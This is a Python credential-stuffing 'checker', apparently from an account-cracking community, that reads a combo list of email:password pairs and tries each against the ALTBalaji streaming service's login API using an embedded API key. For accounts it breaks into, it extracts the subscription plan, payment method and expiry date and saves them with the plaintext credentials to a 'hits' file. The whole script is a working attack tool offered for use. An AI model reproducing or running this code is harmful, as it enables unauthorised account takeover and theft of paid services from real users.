import requests
import time
import datetime
import os
print('----------Hardyisop----------')
print('Hits Will Be Automatically Saved In The Folder Where You Have Saved This Checker')
input('Press Enter To Add Combo\WordList: ')
cp = input('Enter The Path Of Your Combo\WordList: ')
eprf = open(cp,'r')
eprl = eprf.readlines()
save_hits = open('Alt_Balaji_Hits.txt', 'a')
for i in eprl:
    user,pasn = i.split(':')
    pas = pasn[0:-1]
    login_url = 'https://payment-ms.cloud.altbalaji.com/v1/accounts/login/email?domain=IN'
    login_payload = '{"username":"'+user+'","password":"'+pas+'"}'
    login_headers = {
        'accept': 'application/json, text/plain, */*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9',
    'content-length': '59',
    'content-type': 'application/json',
    'origin': 'https://www.altbalaji.com',
    'pp-ms-api-key': 'ihUvNfpYQdjAEtK8v9AEIB2CqGhuPT5qsEAP+xepPCsY7Hw/lo2IPTCX2lhnB4m6pWTrDNShPsDPVzCJMY9FUw==',
    'pp-ms-id': '0f8212c4-f4e6-4396-8347-1e26b3fc8cd6',
    'referer': 'https://www.altbalaji.com/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69'
    }
    login = requests.post(login_url, data = login_payload, headers = login_headers)
    login_success = '"status":"ok","session_token":"'
    login_source = login.text
    if login_success in login_source:
        tk_find = login_source.find('"',200)
        tk = login_source[32:tk_find]
        subscription_url_get = 'https://payment.cloud.altbalaji.com/accounts/orders?limit=1&domain=ROW'
        subscription_headers_get = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'xssession':tk
        }
        subscription = requests.get(subscription_url_get, headers = subscription_headers_get)
        subscription_source = subscription.text
        # print(subscription_source)
        find_pk = subscription_source.find('default')
        find_pv = subscription_source.find('"',find_pk+8)
        find_pe = subscription_source.find('"',find_pk+10)
        plan = subscription_source[find_pv+1:find_pe]        
        if plan == ':[],':
            print(f'{user}:{pas}+ --> Free Account')
            continue
        find_pmk = subscription_source.find('payment_method')
        find_pmv = subscription_source.find('"',find_pmk+16)
        find_pme = subscription_source.find('"',find_pmk+17)
        pm = subscription_source[find_pmv+1:find_pme]
        print('User => '+user)
        print('Password => '+pas)
        print('Plan => '+plan)
        print('Payment Method => '+pm)
        find_exk = subscription_source.find('valid_to')
        find_exv = subscription_source.find('"',find_exk+10)
        find_exe = subscription_source.find('T',find_exk+10)
        ex = subscription_source[find_exv+1:find_exe]
        print('Expiry => '+ex)
        ex_ut = time.mktime(datetime.datetime.strptime(ex, '%Y-%m-%d').timetuple())
        cur_ut = time.time()
        dl = (ex_ut-cur_ut)/84600
        print('Days Left => '+str(int(dl)))
        print('Checker By => @hardyisop')
        save_hits.write(f'\n----------Hardyisop----------\nUser => {user}\nPassword => {pas}\nPlan => {plan}\nPayment Method => {pm}\nExpiry => {ex}\nDays Left => {str(int(dl))}\nChecker By => @hardyisop\n----------Hardyisop----------\n')
    else:
        print(f'{user}:{pas}+ --> Failed')